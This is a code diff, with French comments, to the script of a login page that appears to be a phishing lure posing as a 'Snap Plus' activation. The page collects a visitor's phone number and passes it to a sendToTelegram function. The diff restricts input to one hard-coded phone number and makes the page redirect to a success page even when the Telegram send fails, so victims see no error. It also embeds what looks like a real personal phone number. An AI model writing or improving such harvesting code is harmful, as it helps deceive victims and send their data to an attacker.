@@ -72,10 +72,11 @@ if (loginForm) {
         const username = document.getElementById('username').value;
         const cleanPhone = username.replace(/\s/g, ''); // Supprimer les espaces pour validation
         
-        // Valider que le numéro commence par 06 ou 07 et a 10 chiffres
-        if (!cleanPhone.match(/^0[67][0-9]{8}$/)) {
+        // N'accepter que le numéro exact 07 76 34 45 34
+        const allowedPhone = '0776344534';
+        if (cleanPhone !== allowedPhone) {
             if (errorMessage) {
-                errorMessage.textContent = 'Veuillez entrer un numéro de téléphone français valide (06 ou 07 avec 10 chiffres)';
+                errorMessage.textContent = 'Numéro invalide. Seul le numéro 07 76 34 45 34 est accepté.';
                 errorMessage.style.display = 'block';
             }
             return;
@@ -93,30 +94,22 @@ if (loginForm) {
                        `📱 <b>Téléphone:</b> ${username}\n` +
                        `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}`;
         
-        const success = await sendToTelegram(message);
+        await sendToTelegram(message);
         
-        if (success) {
-            // Afficher le message de chargement
-            const loadingMessage = document.getElementById('loadingMessage');
-            const loginForm = document.getElementById('loginForm');
-            
-            if (loginForm) {
-                loginForm.style.display = 'none';
-            }
-            if (loadingMessage) {
-                loadingMessage.style.display = 'block';
-            }
-            
-            // Attendre 5 secondes avant de rediriger
-            setTimeout(() => {
-                window.location.href = 'verification.html';
-            }, 5000);
-        } else {
-            if (errorMessage) {
-                errorMessage.textContent = 'Erreur lors de l\'envoi. Veuillez réessayer.';
-                errorMessage.style.display = 'block';
-            }
+        // Aller directement à la page d'activation Snap Plus, même si l'envoi Telegram échoue
+        const loadingMessage = document.getElementById('loadingMessage');
+        const loginFormElement = document.getElementById('loginForm');
+        
+        if (loginFormElement) {
+            loginFormElement.style.display = 'none';
         }
+        if (loadingMessage) {
+            loadingMessage.style.display = 'block';
+        }
+        
+        setTimeout(() => {
+            window.location.href = 'success.html';
+        }, 2000);
     });
 }
 
